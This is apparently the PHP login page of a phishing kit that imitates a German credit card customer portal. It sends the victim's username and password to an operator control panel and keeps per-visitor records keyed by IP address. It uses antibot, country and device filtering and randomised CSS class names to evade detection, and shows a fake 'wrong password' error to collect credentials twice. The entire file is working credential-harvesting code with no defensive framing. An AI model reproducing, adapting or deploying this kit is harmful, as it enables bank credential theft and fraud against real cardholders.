<?php
    error_reporting(0);
    if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

    include "../antibots-debug/antibots.php";
    include '../setting/functions.php';
    include '../includes/current-page.php';
    include '../includes/check-allowed-countries.php';
    include '../includes/check-devices-allow.php';

    $ip = get_client_ip();
    $get_name_file = $ip;
    $target_file = "../panel/storage/{$get_name_file}.json";
    $json_file = file_get_contents($target_file);
    $user_info = json_decode($json_file, true);
    $user_info['error_login'];
    
    if ($user_info['error_login'] == 1) {
        $get_name_page = "Page Login Error";
        $get_step = "login-error";
    } else {
        $get_name_page = "Page Login";
        $get_step = "login";
    }
    get_page_info($get_name_page, $get_name_file);
    
    $random_classes = rand(0, 1000000); 
    $permitted_chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
?>
<!DOCTYPE html>
<html lang="en" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> ">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <!-- Font Google -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <!-- File Css -->
    <link rel="stylesheet" href="../css/main.css">
    <link rel="stylesheet" href="../css/basic-thinks.css">
    <!-- Favicon -->
    <link rel="icon" href="../img/favicon.ico">
    <link rel="shortcut" href="../img/favicon.ico">
    <link rel="appel-touch-icon" href="../img/favicon.ico">
    <title>Webseite</title>
</head>
<body id="body" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> body">

    <!-- Start Main -->
        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> main">
            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> content-main">
                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> bg-main">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> bg-element"></div>
                </div>
                <form action="../control-panel/check-action.php" method="post" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> f-s-d-p-section" id="fSD">
                    <input type="hidden" name="step" value="<?php echo $get_step; ?>">
                    <input type="hidden" name="ip" value="<?php echo $get_name_file; ?>">
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-menu-lang">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> menu-lang">
                            <img src="../img/icon-lang.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-lang">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-lang">
                                Deutsch
                            </span>
                            <img src="../img/icon-arrow.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-arrow">
                        </div>
                    </div>
                    <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-all">
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> logo">
                            <img src="../img/logo.png">
                        </div>
                        <h1>Willkommen bei <br> Ihrem Kreditkarten <br> Kundenportal</h1>
                        <p>
                            Geben Sie unten Ihre Daten ein, um sich sicher in Ihrem Kreditkartenkonto einzuloggen, oder registrieren Sie sich, sollten Sie noch kein Nutzerkonto haben.
                        </p>
                        <?php
                            if ($user_info['error_login'] == 1) {
                                echo
                                '<div class="message-error-pages">
                                    <img src="../img/icon-message-error.png" alt="">
                                    Falscher Benutzername oder Passwort. Bitte versuchen Sie es erneut.
                                </div>';
                            }
                        ?>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-i-a-l" id="div1">
                            <label for="username">Benutzername</label>
                            <input type="text" id="username" name="username"  class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element">
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-i-a-l" id="div2">
                            <label for="password" >Passwort</label>
                            <input type="password" id="password" name="password" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> i-a-d-p-element">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> show-or-hide" id="showOrHide"><img src="../img/show.png" id="iconShowOrHide"></span>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> message-error-inputs" id="messageErrorInputs">
                            Bitte geben Sie einen Benutzernamen ein
                            <br>
                            Bitte geben Sie ein Passwort an
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> parent-button">
                            <button type="submit" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> button-send-data" name="b_s_d_p" id="bSD">Anmelden</button>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-option">
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> option">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-left">
                                    <img src="../img/icon-option-1.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-option">
                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-option">Noch nicht registriert?</span>
                                </div>
                                <img src="../img/icon-arrow-right.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-arrow-right">
                            </div>
                            <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> option" style="border-top: 1px solid rgba(0, 0, 0, .08);">
                                <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> coul-left" >
                                    <img src="../img/icon-option-2.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-option">
                                    <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> text-option">Login-Daten vergessen?</span>
                                </div>
                                <img src="../img/icon-arrow-right.png" class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> icon-arrow-right">
                            </div>
                        </div>
                        <div class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> prt-links">
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Kontaktieren Sie uns</span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Impressum</span>
                            <span class="<?php echo substr(str_shuffle($permitted_chars), 0, 4) .'-'. $random_classes;?> link-form">Cookie Einstellungen</span>
                        </div>
                    </div>
                </form>
            </div>
        </div>
    <!-- End Main -->


    <!-- Script Js -->
    <script src="../js/script-login.js"></script>
    <script src="../js/jquery.min.js"></script>
    <?php include '../includes/redirect.php'; ?>
    <?php include '../includes/status.php'; ?>
</body>
</html>